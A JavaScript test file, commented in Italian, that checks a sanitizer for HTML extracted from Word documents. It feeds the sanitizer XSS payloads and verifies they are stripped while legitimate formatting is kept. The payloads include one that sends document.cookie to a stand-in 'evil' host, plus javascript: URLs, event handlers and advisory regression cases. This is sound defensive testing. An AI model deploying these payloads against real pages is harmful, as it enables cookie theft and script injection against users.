import assert from "node:assert/strict";
import { describe, test } from "node:test";
import { sanitizeDocxHtml } from "../src/documents/extract.js";

/**
 * L'HTML ricavato da un file Word viene mostrato nel lettore con dangerouslySetInnerHTML.
 * Un .docx non è fidato: queste prove verificano che il sanitizer rimuova il codice ostile
 * (XSS) ma conservi la formattazione legittima prodotta da mammoth.
 */
describe("sanitizeDocxHtml: rimuove il codice ostile", () => {
  const xss = {
    script: `<p>ok</p><script>fetch("http://evil/"+document.cookie)</script>`,
    "handler onclick": `<p onclick="alert(1)">x</p>`,
    "img onerror": `<img src=x onerror="alert(1)">`,
    "link javascript": `<a href="javascript:alert(1)">l</a>`,
    "link vbscript": `<a href="vbscript:msgbox(1)">l</a>`,
    iframe: `<iframe src="http://evil"></iframe>`,
    "svg onload": `<svg onload="alert(1)"></svg>`,
    object: `<object data="evil.swf"></object>`,
    "data text/html img": `<img src="data:text/html,<script>alert(1)</script>">`,
    "style con javascript": `<p style="background:url(javascript:alert(1))">x</p>`,
    // payload degli avvisi di sicurezza di sanitize-html <= 2.17.6 (GHSA-vccv-cmxp-4j9h,
    // GHSA-g8qq-57p8-ggw5, GHSA-jxwj-j7wr-gfrw): restano qui contro le regressioni
    "javascript: in action/formaction/poster/background":
      `<form action="javascript:alert(1)"><button formaction="javascript:alert(2)">x</button></form>` +
      `<video poster="javascript:alert(3)"></video><table background="javascript:alert(4)"><tr><td>t</td></tr></table>`,
    "SVG SMIL animate": `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text y="20">clic</text></a></svg>`,
    "chiusura </textarea/>": `<textarea></textarea/><img src=x onerror=alert(1)>`,
  };

  for (const [name, html] of Object.entries(xss)) {
    test(name, () => {
      const out = sanitizeDocxHtml(html);
      assert.doesNotMatch(out, /<script|<iframe|<object|<svg|<animate|<form|<textarea|onclick|onerror|onload|javascript:|vbscript:|data:text\/html/i, out);
    });
  }
});

describe("sanitizeDocxHtml: conserva la formattazione legittima", () => {
  test("titoli, grassetto, corsivo, liste e tabelle restano", () => {
    const out = sanitizeDocxHtml(
      `<h1>Titolo</h1><p>Testo <strong>bold</strong> <em>italic</em></p><ul><li>a</li></ul><table><tr><td>c</td></tr></table>`,
    );
    assert.match(out, /<h1>Titolo<\/h1>/);
    assert.match(out, /<strong>bold<\/strong>/);
    assert.match(out, /<li>a<\/li>/);
    assert.match(out, /<td>c<\/td>/);
  });

  test("i link http restano ma si aprono in sicurezza (noopener, nuova scheda)", () => {
    const out = sanitizeDocxHtml(`<a href="https://club.example">sito</a>`);
    assert.match(out, /href="https:\/\/club\.example"/);
    assert.match(out, /rel="noopener noreferrer nofollow"/);
    assert.match(out, /target="_blank"/);
  });

  test("le immagini incorporate dal Word (data:image base64) e http restano", () => {
    assert.match(sanitizeDocxHtml(`<img src="data:image/png;base64,iVBORw0" alt="x">`), /data:image\/png;base64,iVBORw0/);
    assert.match(sanitizeDocxHtml(`<img src="https://club.example/logo.png">`), /src="https:\/\/club\.example\/logo\.png"/);
  });
});
